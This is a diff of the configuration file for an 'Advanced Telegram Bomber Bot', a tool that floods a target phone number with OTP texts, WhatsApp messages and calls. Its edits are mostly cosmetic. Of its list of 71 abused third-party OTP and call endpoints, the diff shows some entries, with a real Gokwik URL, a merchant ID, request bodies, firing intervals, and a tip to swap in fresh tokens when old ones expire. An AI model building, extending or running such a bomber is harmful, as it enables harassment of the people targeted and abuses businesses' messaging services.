@@ -1,13 +1,14 @@
-# config.py – Advanced Telegram Bomber Bot
+# config.py – Final Configuration for Advanced Telegram Bomber Bot
+import os
+
 # ============================== DATABASE ==============================
 DB_FILE = "bot_data.db"
 
 # ============================== BOT ENVIRONMENT ==============================
-import os
 BOT_TOKEN        = os.getenv("BOT_TOKEN")
 OWNER_ID         = int(os.getenv("OWNER_ID", "0"))
 PORT             = int(os.getenv("PORT", 10000))
-WEBHOOK_BASE     = os.getenv("RENDER_EXTERNAL_URL")  # Render sets this automatically
+WEBHOOK_BASE     = os.getenv("RENDER_EXTERNAL_URL")   # Render sets this automatically
 
 # ============================== BRANDING ==============================
 BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"
@@ -15,24 +16,23 @@ BRANDING = "\n\n🤖 <b>Powered by NULL PROTOCOL</b>"
 # ============================== BOMBING DEFAULTS ==============================
 DEFAULT_COUNTRY_CODE = "91"
 
-# Interval settings (can be changed live by admin)
-DEFAULT_CALL_INTERVAL = 25     # seconds between successive CALL API hits
-DEFAULT_SMS_INTERVAL   = 5     # seconds between SMS/WhatsApp rounds
+DEFAULT_CALL_INTERVAL = 25    # seconds between successive CALL API hits
+DEFAULT_SMS_INTERVAL   = 5    # seconds between SMS/WhatsApp rounds
 
 MIN_CALL_INTERVAL = 10
 MIN_SMS_INTERVAL  = 2
 MAX_INTERVAL      = 120
 
 AUTO_STOP_SECONDS   = 20 * 60   # 20 minutes per session
-MAX_REQUEST_LIMIT   = 9_000_000 # soft limit (per session)
+MAX_REQUEST_LIMIT   = 9_000_000 # soft limit per session
 TELEGRAM_RATE_LIMIT = 5         # minimum seconds between status updates
 
-# ============================== 70 APIs ====================================
+# ============================== 71 APIs ====================================
 # CALL APIs (7) – hit one by one every call_interval seconds
-# SMS/WHATSAPP APIs (63) – all fired together every sms_interval seconds
+# SMS / WHATSAPP APIs (64) – all fired together every sms_interval seconds
 BOMBER_APIS = [
 
-    # ----------------- CALL APIs ------------------
+    # ----------------- CALL APIs (7) ------------------
     {
         "name": "GauravCyber Call",
         "type": "CALL",
@@ -90,7 +90,7 @@ BOMBER_APIS = [
         "data": '{"phone":"{phone}"}'
     },
 
-    # ----------------- SMS / WHATSAPP APIs ------------------
+    # ----------------- SMS / WHATSAPP APIs (64) ------------------
     {
         "name": "OYO Rooms",
         "type": "SMS",
@@ -150,14 +150,14 @@ BOMBER_APIS = [
         "headers": {"Content-Type": "application/x-www-form-urlencoded"},
         "data": "mobile={phone}"
     },
-    # --- Gokwik based (tokens may expire) ---
+    # --- Gokwik based (tokens may expire, replace with fresh ones) ---
     {
         "name": "GheeAPI (Gokwik)",
         "type": "SMS",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
         "method": "POST",
         "headers": {
-            "Authorization": "Bearer YOUR_JWT_HERE",       # <-- Replace with valid token
+            "Authorization": "Bearer YOUR_JWT_HERE",        # <-- Replace with valid token
             "gk-merchant-id": "19g6im8srkz9y",
             "Content-Type": "application/json"
         },
@@ -559,5 +559,5 @@ BOMBER_APIS = [
 CALL_APIS = [api for api in BOMBER_APIS if api["type"] == "CALL"]
 SMS_APIS  = [api for api in BOMBER_APIS if api["type"] in ("SMS", "WHATSAPP")]
 
-# (Optional) Print counts at startup:
-# print(f"[CONFIG] Loaded {len(CALL_APIS)} call APIs and {len(SMS_APIS)} SMS/WhatsApp APIs")
+# Optional: print counts at startup
+# print(f"Loaded {len(CALL_APIS)} call APIs and {len(SMS_APIS)} SMS/WhatsApp APIs")
